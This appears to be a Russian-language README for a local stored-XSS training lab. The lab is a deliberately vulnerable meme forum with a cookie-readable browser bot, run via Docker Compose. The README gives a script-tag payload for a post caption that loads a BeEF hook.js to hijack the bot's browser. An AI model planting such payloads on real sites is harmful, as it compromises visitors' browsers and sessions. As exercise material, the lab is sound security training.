# Stored XSS / Meme Forum

Мем-форум с регистрацией, постами и комментариями. Семь разных начальных мемов с подписями и обсуждениями. Авторизованный бот читает ленту каждые 7 секунд; личная заметка доступна только его профилю.

## Запуск

Скопируйте всю эту папку в любое место и из неё выполните:

~~~sh
docker compose up --build
~~~

Откройте http://127.0.0.1:8083. Этот вариант рассчитан на Kali / Linux с Docker Engine и Docker Compose v2.
Бот использует сеть хоста (`network_mode: host`). В Docker Desktop для этого требуется включить host networking.
Первая сборка загружает зависимости. Все файлы и готовые учебные настройки находятся внутри этой папки;
Python, Node.js, Go и отдельная установка БД на host не нужны. Порт 8083 должен быть свободен.

Приложение и browser bot запускаются вместе. Cookie этой учебной задачи доступна JavaScript.
Все картинки локальные; hook не встроен. BeEF или аналог запускается отдельно.
Бот может обращаться к любым доступным из контейнера HTTP(S) и WS(S) адресам,
в том числе к WebSocket на отдельном порту. Список разрешённых адресов и настройка
XSS_HOOK_ORIGIN не нужны; форум использует bridge, бот — сеть хоста.
Для BeEF, запущенного на той же Kali, используйте `http://127.0.0.1:3000/hook.js`.
Бот разделяет сетевой namespace Kali: его localhost указывает на Kali, поэтому BeEF
может слушать только 127.0.0.1. Форум бот открывает через опубликованный порт 8083.
Если BeEF работает на другом порту, укажите этот порт в URL хука.
Подключение hook не добавляется автоматически. Обновление страницы каждые 7 секунд
может прерывать и восстанавливать его соединение. Chromium sandbox включён.
У xss-bot задано `apparmor=unconfined`: профиль `docker-default` на Kali может
запрещать `userns_create`, необходимый sandbox Chromium. Это снимает слой AppArmor
только с контейнера бота; системные настройки AppArmor не меняются. Seccomp,
непривилегированный пользователь, read-only filesystem и Chromium sandbox сохранены.
Пароль бота встроен в серверный код форума и бота; при смене обновите оба значения.
Флаг находится только в коде сервера форума и не копируется в образ бота.
После изменения исходников пересоберите образы. При смене пароля форум обновляет
хеш пароля бота и завершает его старые сессии; посты, комментарии и аккаунты сохраняются.

## Локальный BeEF на Kali

Запустите BeEF на Kali и проверьте доступность его скрипта:

~~~sh
curl -f http://127.0.0.1:3000/hook.js -o /dev/null
docker compose up -d --build
~~~

Войдите на форум, создайте пост и поместите в подпись:

~~~html
<script src="http://127.0.0.1:3000/hook.js"></script>
~~~

Бот прочитает пост на следующем цикле. Проверьте появление браузера в интерфейсе
BeEF. BeEF должен рекламировать браузеру доступные адреса polling/WebSocket;
для этой схемы подойдёт 127.0.0.1 с портами вашей конфигурации BeEF.
Открывайте форум в браузере Kali, если хотите подключить и собственный браузер:
на другом компьютере 127.0.0.1 указывает на тот другой компьютер.
Автоматического подключения без XSS-поста нет. Обновление ленты раз в 7 секунд
перезагружает хук, поэтому соединение в BeEF может переподключаться.

После обновления пересоздайте контейнеры и проверьте состояние:

~~~sh
docker compose up -d --build --force-recreate
docker compose ps -a
docker compose logs --tail=30 xss-bot
~~~

Оба сервиса должны получить статус healthy. Для проверки циклов бота выполните
команду дважды с интервалом 10 секунд: поле visits должно увеличиваться.

~~~sh
docker compose exec xss-bot node -e 'console.log(require("node:fs").readFileSync("/tmp/bot-state.json", "utf8"))'
~~~

Если Chromium всё ещё падает с Permission denied, проверьте журнал ядра Kali:
`sudo journalctl -k --since "10 minutes ago" --no-pager`.
Новый отказ с profile="unconfined" требует отдельной настройки политики user namespaces
на хосте; отключать sandbox Chromium для этого не требуется.

Остановка: Ctrl+C, затем docker compose down. Named volumes сохраняются.
Для чистого начального состояния этой задачи: docker compose down -v, затем повторный запуск.
Это удаляет только данные данного Compose project. У задач без named volumes достаточно пересоздать контейнер.

Учебные значения встроены в серверные исходники и попадают в образ при сборке. После изменений выполните `docker compose up -d --build`.
Участникам выдавайте адрес стенда: доступ к исходникам и истории Git позволяет найти ответы напрямую.
Стенд предназначен для локального обучения. Публичные ports привязаны к 127.0.0.1.
Концептуальные подсказки — HINTS.md; причина ошибки и безопасный вариант — FIX.md.
Attribution и лицензии — NOTICE.md и файлы соответствующих зависимостей.
